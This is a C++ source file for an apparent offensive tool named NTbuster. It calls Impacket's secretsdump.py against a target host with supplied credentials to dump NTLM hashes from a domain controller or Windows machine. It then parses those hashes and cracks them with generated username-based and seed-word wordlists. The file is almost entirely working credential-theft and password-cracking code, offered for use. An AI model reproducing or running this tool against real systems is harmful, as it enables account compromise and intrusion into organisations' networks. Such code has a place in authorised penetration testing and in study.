#include <iostream>
#include <vector>
#include "ntlm.h"
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <unordered_map>
#include <regex>
#include <cstring>
#include <cstring>
#include <CLI/CLI.hpp>
#include <thread>
#include <stdlib.h>
#include <cctype>
#include <future>
#include <algorithm>
using namespace std;

class Cracker {
    public:
        std::string ip_address;
        std::string username;
        std::string password;
        std::string target;
        std::string seed_words_path;

        void launch(int target_machine) {
            std::vector<std::future<void>> futures;

            std::cout << "\033[33m" << "[*] Dumping hashes..." << 
                                                     "\033[0m" <<
            std::endl;
            std::string output = get_ntds(target_machine);
            std::cout << "\033[33m" << "[*] Parsing dumped hashes..." << 
                                                            "\033[0m" <<
            std::endl;
            std::unordered_map<std::string, std::string> creds = parse_hashes(output);            
            clean();            
            for (const auto& kv : creds) {
                std::cout << "\033[33m" << "[*] The password of '" << kv.first << 
                                                            "' is cracking..." << 
                                                                     "\033[0m" << 
                std::endl;
                if (!seed_words_path.empty()) {
                    std::vector<string> seed_words = get_wordlist(seed_words_path);
                    std::vector<string> seed_wordlist;
                    for (std::string seed_word : seed_words) {
                        std::vector<std::string> wl = generate(seed_word);
                        seed_wordlist.insert(seed_wordlist.end(), wl.begin(), wl.end());
                    }
                    auto future = std::async(std::launch::async, 
                                             &Cracker::crack, 
                                             this, 
                                             seed_wordlist, 
                                             kv.second.c_str(), 
                                             kv.first.c_str());
                    futures.push_back(std::move(future));
                }
                else {
                    std::vector<std::string> wl = generate(kv.first);
                    auto future = std::async(std::launch::async, 
                                             &Cracker::crack, 
                                             this, wl, 
                                             kv.second.c_str(), 
                                             kv.first.c_str());
                    futures.push_back(std::move(future));
                }
            }
            std::for_each(futures.begin(), futures.end(), [](std::future<void>& f) {
                f.wait();
            });
        }

    private:
        std::vector<std::string> check_username(const std::string& username) {
            std::vector<std::string> result;

            // Check if the username contains a backslash
            size_t pos_backslash = username.find('\\');
            // Check if the username contains a dot
            size_t pos_dot = username.find('.');

            if (pos_backslash != std::string::npos && pos_dot != std::string::npos) {
                // Both backslash and dot found, split the string into three substrings
                std::string domain_name = username.substr(0, pos_backslash);
                size_t pos_dot_domain_name = domain_name.find('.');
                size_t pos_last_dot = username.rfind('.');
                if (pos_dot_domain_name != std::string::npos && 
                    pos_dot_domain_name != pos_last_dot && 
                    pos_last_dot > pos_backslash) {
                    // dot found in domain name
                    result.push_back(domain_name.substr(0, pos_dot_domain_name));
                                result.push_back(username.substr(pos_backslash + 1, 
                                                 pos_last_dot - pos_backslash - 1));
                                result.push_back(username.substr(pos_last_dot + 1));
                    }   
                    else if (pos_dot_domain_name != std::string::npos && 
                             pos_dot_domain_name != pos_last_dot && 
                             pos_last_dot < pos_backslash) {
                        result.push_back(username.substr(0, pos_dot_domain_name));
                        result.push_back(username.substr(pos_backslash + 1));
                    } 
                    else if (pos_dot_domain_name == std::string::npos && 
                             pos_last_dot > pos_backslash) {
                        result.push_back(username.substr(0, pos_backslash));
                        result.push_back(username.substr(pos_backslash + 1, 
                                         pos_last_dot - pos_backslash - 1));
                        result.push_back(username.substr(pos_last_dot + 1));
                    }
                }   
                    else if (pos_backslash != std::string::npos) {
                    // Backslash found, split the string into two substrings
                    result.push_back(username.substr(0, pos_backslash));
                    result.push_back(username.substr(pos_backslash + 1));
                }   
                    else if (pos_dot != std::string::npos) {
                    // Dot found, split the string into two substrings
                    result.push_back(username.substr(0, pos_dot));
                    result.push_back(username.substr(pos_dot + 1));
                }   
                    else {
                    // Neither backslash nor dot found 
                    // return the whole string as a single substring
                    result.push_back(username);
                }

            return result;
        }

        std::vector<string> generate(std::string username) {
            std::vector<string> usernames;
            std::vector<string> mixed_extensions = extender(extensions);
            usernames = check_username(username);
            std::vector<string> new_usernames; // create a separate vector for new usernames

            for (std::size_t i = 0; i < usernames.size(); i++) {
                for (const auto& extension : mixed_extensions) {    
                    std::string new_username = usernames[i] + extension; // create a new username
                    new_usernames.push_back(new_username); // add it to the new vector
                    char& first_char = new_username.front();
                    if (std::islower(first_char)) {
                        first_char = std::toupper(first_char);
                        new_usernames.push_back(new_username);
                    } else if (std::isupper(first_char)) {
                        first_char = std::tolower(first_char);
                        new_usernames.push_back(new_username);
                    }
                }
            }
            return new_usernames;
        }

        void crack(const std::vector<string>& wordlist, const char* hash, const char* username){
            for (std::size_t i = 0; i < wordlist.size(); i++) {
                const char* generated_hash = gen_ntlm(wordlist[i]);
                if (std::strcmp(hash, generated_hash) == 0) {
                    std::string masked_password = wordlist[i].substr(0, 3) + 
                                std::string(wordlist[i].length() - 4, '*') + 
                    wordlist[i].substr(wordlist[i].length() - 1, wordlist[i].length());
                    std::cout << "\033[32m" << "[+] " << "\033[1;32m" << "Cracked: " <<
                                                                           "\033[0m" <<
                                                                          "\033[32m" <<
                                                            "['" << username << "':" <<
                                                      "'" << masked_password << "']" <<
                                                                           "\033[0m" <<
                    std::endl;
                    break;
                }
            }
        }
        
        std::string get_ntds(int target_machine) {
            setenv("TARGET", target.c_str(), 1);
            if (target_machine == 1) {
                system("/usr/bin/python3 ./vendor/scripts/secretsdump.py -just-dc-ntlm \"${TARGET}\" > /tmp/output.txt");
            } else {
                system("/usr/bin/python3 ./vendor/scripts/secretsdump.py \"${TARGET}\" > /tmp/output.txt");
            }

            ifstream fin("/tmp/output.txt");
            string output = "";
            while (fin) {
                string line; 
                getline(fin, line);
                output += line + "\n";
            }
            return output;
        }

        std::vector<std::string> get_wordlist(const std::string& path) {
            std::vector<std::string> wordlist;
            std::ifstream fin(path);
            if (!fin.is_open()) {
                std::cerr << "\033[31m" << 
                    "[-] Error: failed to open file '" << 
                                                  path << 
                                                   "'" <<
                                             "\033[0m" << 
                    std::endl;
                return wordlist;
            }
            std::string line;
            while (std::getline(fin, line)) {
                if (!line.empty()) {
                    wordlist.push_back(line);
                }
            }
            fin.close();
            return wordlist;
        }

        std::unordered_map<std::string, std::string> parse_hashes(const std::string& input) {        
            std::unordered_map<std::string, std::string> result;
            std::regex re("nthash\\)\\n((?:.*\\n)*?)\\[\\*\\] Cleaning");
            std::string modified_input = input; // Create a non-const copy of the input string
            std::smatch match;
            std::string matched_str;
            std::vector<std::string> split_result;
            std::vector<std::string> split_result_line;
            std::string token;
            std::string token_line;
            std::istringstream iss("");
            std::istringstream iss_line("");
            std::unordered_map<std::string, std::string> creds;

            if (std::regex_search(modified_input, match, re)) {        
                    matched_str = match[1].str();
            }
            iss.str(matched_str);
            while (std::getline(iss, token)){
                split_result.push_back(token);
            }

            for (const auto& str : split_result) {
                iss_line.clear();
                split_result_line.clear();
                iss_line.str(str);

                while (std::getline(iss_line, token, ':')){
                    split_result_line.push_back(token);
                }
                if (split_result_line.size() >= 3) {
                    creds[split_result_line[0]] = split_result_line[3];
                }
            }
            return creds;
        }

        void clean() {
            std::string command = "rm -rf /tmp/output.txt";
            system(command.c_str());
        }

        std::vector<std::string> extensions = {
            "123456",
            "654321",
            "1234567",
            "7654321",
            "12345678",
            "87654321",
            "123456789",
            "987654321",
            "1234567890",
            "0987654321",
            "000",
            "001",
            "002",
            "003",
            "004",
            "005",
            "007",
            "008",
            "009",
            "0000",
            "0001",
            "0002",
            "0003",
            "0004",
            "0005",
            "0006",
            "0007",
            "0008",
            "0009",
            "00001",
            "00002",
            "00003",
            "00004",
            "00005",
            "00006",
            "00007",
            "00008",
            "00009",
            "000000"
        };

        std::vector<std::string> extender(std::vector<std::string> initial_extensions){
            std::vector<std::string> extensions;
            for (int i = 0; i < 100001; i++) {
                std::string str_i = std::to_string(i);
                extensions.push_back(str_i);
                extensions.push_back(str_i + "!");
                extensions.push_back(str_i + "!!");
                extensions.push_back(str_i + "!!!");
                extensions.push_back(str_i + "@");
                extensions.push_back(str_i + "!@#");
                extensions.push_back(str_i + "!@");
                extensions.push_back(str_i + "!@#$%");
                extensions.push_back(str_i + "!@#$%^");
            }
            initial_extensions.insert(initial_extensions.end(), 
                                        extensions.begin(), 
                                        extensions.end());
            return initial_extensions;
        }
};

int main(int argc, char** argv) {
    std::string ip_address, username, password, seed_words_path;
    int target_machine;
    std::string python_check_command = "/usr/bin/python3 --version > /dev/null 2>&1";
    std::string impacket_check_command = "/usr/bin/python3 -c \"import impacket\" > /dev/null 2>&1";
    Cracker cracker;
    // draw banner
    const char* banner_text = "    _   __________               __           \n"
                     "   / | / /_  __/ /_  __  _______/ /____  _____\n"
                     "  /  |/ / / / / __ \\/ / / / ___/ __/ _ \\/ ___/\n"
                     " / /|  / / / / /_/ / /_/ (__  ) /_/  __/ /    \n"
                     "/_/ |_/ /_/ /_.___/\\__,_/____/\\__/\\___/_/     \n";
    cout << "\033[31m" << banner_text << "\033[0m" << endl;
 
    // Check if Python3 is installed
    if (system(python_check_command.c_str()) != 0) {
        std::cerr << "\033[31m" << "[-] Error: Python3 is not installed." << 
                                                                "\033[0m" <<
        std::endl;
        return EXIT_FAILURE;
    }

    // Check if Impacket is installed
    if (system(impacket_check_command.c_str()) != 0) {
        std::cerr << "\033[31m" << "[-] Error: Impacket is not installed." << 
                   "Please install it by running 'pip3 install impacket'." <<
                                                                 "\033[0m" <<
        std::endl;
        return EXIT_FAILURE;
    }
    
    CLI::App app{"NTbuster"};

    app.add_option("-t,--target-ip", ip_address, "Target IP address")->required();
    app.add_option("-u,--username", username, "Username")->required();
    app.add_option("-p,--password", password, "Password")->required();
    app.add_option("-w,--seed-words", seed_words_path, "File path of seed words");
    app.add_option("-m, --target-machine", target_machine, "Domain Controller = 1, Regular Windows = 2")->required();

    CLI11_PARSE(app, argc, argv);

    std::string target = username + ":" + password + "@" + ip_address;
    
    if (target_machine > 2 || target_machine < 1) {
        std::cerr << "\033[31m" << "[-] Error: Target machine can be 1 or 2" << "\033[0m" << std::endl;
        return EXIT_FAILURE;
    }

    if (!seed_words_path.empty()) {
        cracker.seed_words_path = seed_words_path;
        cracker.target = target;
        cracker.launch(target_machine);
    } else {
        cracker.target = target;
        cracker.launch(target_machine);
    }
    
    return 0;
}
